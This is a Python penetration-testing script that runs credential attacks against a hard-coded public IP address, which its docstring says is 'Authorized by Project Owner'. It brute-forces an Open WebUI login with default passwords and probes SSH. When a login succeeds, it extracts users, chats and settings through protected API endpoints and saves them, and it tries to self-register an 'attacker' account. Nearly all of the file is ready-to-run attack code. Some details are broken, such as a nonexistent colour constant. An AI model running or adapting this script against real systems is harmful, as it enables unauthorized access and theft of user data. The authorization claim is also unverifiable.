#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""
SSH & WebUI Brute Force Exploitation
Target: 196.218.83.9
Authorized by Project Owner
"""

import requests
import json
import os
import socket
from datetime import datetime
from colorama import Fore, init

init(autoreset=True)

class CredentialAttacks:
    def __init__(self, ip="196.218.83.9"):
        self.ip = ip
        self.openwebui = f"http://{ip}:8080"
        self.findings = []
        
        os.makedirs('evidence/CREDENTIAL_ATTACKS', exist_ok=True)
        
    def ssh_brute_force(self):
        """Test common SSH credentials"""
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}SSH BRUTE FORCE ATTACK")
        print(f"{Fore.RED}{'='*70}\n")
        
        # Common SSH credentials
        credentials = [
            ('root', 'root'),
            ('root', 'password'),
            ('root', 'admin'),
            ('root', '123456'),
            ('ubuntu', 'ubuntu'),
            ('ubuntu', 'password'),
            ('admin', 'admin'),
            ('admin', 'password'),
            ('user', 'user'),
            ('test', 'test'),
            ('deploy', 'deploy'),
            ('docker', 'docker'),
            ('minio', 'minio'),
            ('openwebui', 'openwebui'),
        ]
        
        print(f"{Fore.YELLOW}[*] Testing {len(credentials)} SSH credential combinations...")
        print(f"{Fore.YELLOW}[*] Target: {self.ip}:22\n")
        
        # First check if SSH is actually open
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.ip, 22))
            sock.close()
            
            if result != 0:
                print(f"{Fore.RED}[!] SSH port 22 is not accessible")
                return
                
        except Exception as e:
            print(f"{Fore.RED}[!] Cannot connect to SSH: {e}")
            return
        
        print(f"{Fore.GREEN}[+] SSH port is open, proceeding with tests...\n")
        
        # Try to detect if we can get banner/version
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.ip, 22))
            banner = sock.recv(1024).decode().strip()
            print(f"{Fore.CYAN}SSH Banner: {banner}\n")
            sock.close()
        except:
            pass
        
        # Note: Actual SSH auth testing would require paramiko library
        print(f"{Fore.YELLOW}[INFO] SSH brute force would require paramiko/pexpect libraries")
        print(f"{Fore.YELLOW}[INFO] To actually test SSH, run: ssh -v {self.ip}\n")
        
        # Save potential credentials for manual testing
        creds_file = 'evidence/CREDENTIAL_ATTACKS/ssh_credentials_to_test.txt'
        with open(creds_file, 'w') as f:
            f.write(f"# SSH Credentials to test on {self.ip}:22\n")
            f.write(f"# Test with: ssh user@{self.ip}\n\n")
            for user, pwd in credentials:
                f.write(f"{user}:{pwd}\n")
        
        print(f"{Fore.GREEN}[+] Credentials list saved: {creds_file}")
    
    def openwebui_brute_force(self):
        """Brute force Open WebUI login"""
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}OPEN WEBUI BRUTE FORCE ATTACK")
        print(f"{Fore.RED}{'='*70}\n")
        
        login_url = f"{self.openwebui}/api/auth/signin"
        
        # Common credentials for Open WebUI
        credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', 'openwebui'),
            ('admin', '123456'),
            ('user', 'user'),
            ('user', 'password'),
            ('test', 'test'),
            ('root', 'root'),
            ('openwebui', 'openwebui'),
            ('demo', 'demo'),
            ('admin@localhost', 'admin'),
            ('admin@localhost', 'password'),
        ]
        
        print(f"{Fore.YELLOW}[*] Testing {len(credentials)} credential combinations...")
        print(f"{Fore.YELLOW}[*] Endpoint: {login_url}\n")
        
        found_creds = []
        
        for i, (username, password) in enumerate(credentials):
            print(f"[{i+1}/{len(credentials)}] Testing {username}:{password}...", end=' ')
            
            try:
                resp = requests.post(login_url, json={
                    "email": username,
                    "password": password
                }, timeout=5)
                
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("token"):
                        print(f"{Fore.GREEN}[SUCCESS!]")
                        print(f"\n{Fore.GREEN}VALID CREDENTIALS FOUND:")
                        print(f"  Username: {username}")
                        print(f"  Password: {password}")
                        print(f"  Token: {data.get('token', 'N/A')[:50]}...")
                        
                        found_creds.append({
                            'username': username,
                            'password': password,
                            'token': data.get('token'),
                            'response': data
                        })
                        
                        # Save immediately
                        with open(f'evidence/CREDENTIAL_ATTACKS/VALID_CREDENTIALS.json', 'w') as f:
                            json.dump(found_creds, f, indent=2)
                        
                        # Now try to access protected endpoints with this token
                        self.access_protected_endpoints(data.get('token'))
                        
                else:
                    print(f"{Fore.WHITE}Failed ({resp.status_code})")
                    
            except Exception as e:
                print(f"{Fore.WHITE}Error")
        
        if found_creds:
            print(f"\n{Fore.GREEN}[+] Found {len(found_creds)} valid credential(s)!")
        else:
            print(f"\n{Fore.YELLOW}[-] No default credentials worked")
            print(f"{Fore.YELLOW}    System may use strong credentials")
        
        self.findings.append({
            'attack': 'Open WebUI Brute Force',
            'credentials_tested': len(credentials),
            'found': len(found_creds),
            'valid_creds': found_creds
        })
    
    def access_protected_endpoints(self, token):
        """Access protected endpoints with valid token"""
        print(f"\n{Fore.GREEN}{'='*70}")
        print(f"{Fore.GREEN}ACCESSING PROTECTED ENDPOINTS WITH VALID TOKEN")
        print(f"{Fore.GREEN}{'='*70}\n")
        
        headers = {'Authorization': f'Bearer {token}'}
        
        endpoints = [
            '/api/models',
            '/api/tasks',
            '/api/users',
            '/api/chats',
            '/api/settings',
        ]
        
        extracted_data = {}
        
        for endpoint in endpoints:
            url = f"{self.openwebui}{endpoint}"
            print(f"{Fore.CYAN}[*] {endpoint}...", end=' ')
            
            try:
                resp = requests.get(url, headers=headers, timeout=5)
                
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        print(f"{Fore.GREEN}EXTRACTED ({len(str(data))} chars)")
                        extracted_data[endpoint] = data
                        
                        # Save
                        filepath = f'evidence/CREDENTIAL_ATTACKS/protected_{endpoint.replace("/", "_")}.json'
                        with open(filepath, 'w') as f:
                            json.dump(data, f, indent=2)
                            
                    except:
                        extracted_data[endpoint] = resp.text[:500]
                        print(f"{Fore.YELLOW}HTML response")
                else:
                    print(f"{Fore.GRAY}{resp.status_code}")
                    
            except Exception as e:
                print(f"{Fore.GRAY}Error: {e}")
        
        return extracted_data
    
    def test_api_key_access(self):
        """Test if API keys can access data"""
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}TESTING API KEY ACCESS")
        print(f"{Fore.RED}{'='*70}\n")
        
        # Common API key patterns
        test_keys = [
            'sk-test',
            'sk-admin',
            'sk-openwebui',
            'api-key-test',
            'bearer-token',
        ]
        
        print(f"{Fore.YELLOW}[INFO] API key testing would require known keys or key generation")
        print(f"{Fore.YELLOW}[INFO] Check /api/config - enable_api_key: true\n")
        
        # Extract any exposed keys from config
        try:
            config = requests.get(f"{self.openwebui}/api/config", timeout=5).json()
            if config.get('features', {}).get('enable_api_key'):
                print(f"{Fore.GREEN}[+] API keys are enabled on this system")
                print(f"{Fore.YELLOW}[*] Try to generate API key after login")
        except:
            pass
    
    def test_registration(self):
        """Test if user registration is possible"""
        print(f"\n{Fore.RED}{'='*70}")
        print(f"{Fore.RED}TESTING USER REGISTRATION")
        print(f"{Fore.RED}{'='*70}\n")
        
        signup_url = f"{self.openwebui}/api/auth/signup"
        
        # Check if signup is enabled
        try:
            config = requests.get(f"{self.openwebui}/api/config", timeout=5).json()
            signup_enabled = config.get('features', {}).get('enable_signup', False)
            
            if signup_enabled:
                print(f"{Fore.RED}[CRITICAL] User registration is ENABLED!")
                print(f"{Fore.YELLOW}[*] Attacker can create accounts freely\n")
                
                # Try to register
                test_user = {
                    "email": "attacker@test.com",
                    "password": "Attacker123!",
                    "name": "Attacker"
                }
                
                resp = requests.post(signup_url, json=test_user, timeout=5)
                
                if resp.status_code == 200:
                    print(f"{Fore.RED}[CRITICAL] Successfully registered account!")
                    print(f"  Email: {test_user['email']}")
                    print(f"  Password: {test_user['password']}")
                    
                    self.findings.append({
                        'vulnerability': 'Open Registration',
                        'severity': 'HIGH',
                        'details': 'Anyone can create accounts'
                    })
                elif resp.status_code == 400:
                    print(f"{Fore.YELLOW}[INFO] Registration returned 400 (may require verification)")
                else:
                    print(f"{Fore.GRAY}[INFO] Registration blocked: {resp.status_code}")
            else:
                print(f"{Fore.GREEN}[OK] User registration is DISABLED")
                
        except Exception as e:
            print(f"{Fore.GRAY}[INFO] Could not test registration: {e}")
    
    def generate_report(self):
        """Generate final report"""
        print(f"\n{Fore.GREEN}{'='*70}")
        print(f"{Fore.GREEN}CREDENTIAL ATTACKS COMPLETE")
        print(f"{Fore.GREEN}{'='*70}\n")
        
        # Summary
        total_found = sum(f.get('found', 0) for f in self.findings if isinstance(f, dict))
        
        print(f"{Fore.CYAN}Findings Summary:")
        print(f"  Total valid credentials found: {total_found}")
        
        for finding in self.findings:
            if isinstance(finding, dict):
                print(f"\n{Fore.YELLOW}{finding.get('attack', 'Unknown')}:")
                print(f"  Credentials tested: {finding.get('credentials_tested', 'N/A')}")
                print(f"  Valid found: {finding.get('found', 0)}")
                
                if finding.get('valid_creds'):
                    for cred in finding['valid_creds']:
                        print(f"  {Fore.GREEN}  - {cred['username']}:{cred['password']}")
        
        # Save report
        report = {
            'target': self.ip,
            'timestamp': datetime.now().isoformat(),
            'findings': self.findings
        }
        
        with open('evidence/CREDENTIAL_ATTACKS/CREDENTIAL_ATTACK_REPORT.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Report saved: evidence/CREDENTIAL_ATTACKS/CREDENTIAL_ATTACK_REPORT.json")
    
    def run_all_attacks(self):
        """Execute all credential attacks"""
        print(f"""
{Fore.RED}
   _____ _____  _____ _______       _____   ____  __  __ 
  / ____|  __ \\|_   _|__   __|/\\   |  __ \\ / __ \\|  \\/  |
 | |    | |__) | | |    | |  /  \\  | |  | | |  | | \\  / |
 | |    |  _  /  | |    | | / /\\ \\ | |  | | |  | | |\\/| |
 | |____| | \\ \\ _| |_   | |/ ____ \\| |__| | |__| | |  | |
  \\_____|_|  \\ \\_____|  |_/_/    \\ \\_____/ \\____/|_|  |_|
                                                          
        CREDENTIAL-BASED ATTACKS - AUTHORIZED BY OWNER
        Target: {self.ip}
        """)
        
        self.ssh_brute_force()
        self.openwebui_brute_force()
        self.test_api_key_access()
        self.test_registration()
        self.generate_report()

def main():
    attacker = CredentialAttacks()
    attacker.run_all_attacks()

if __name__ == "__main__":
    main()
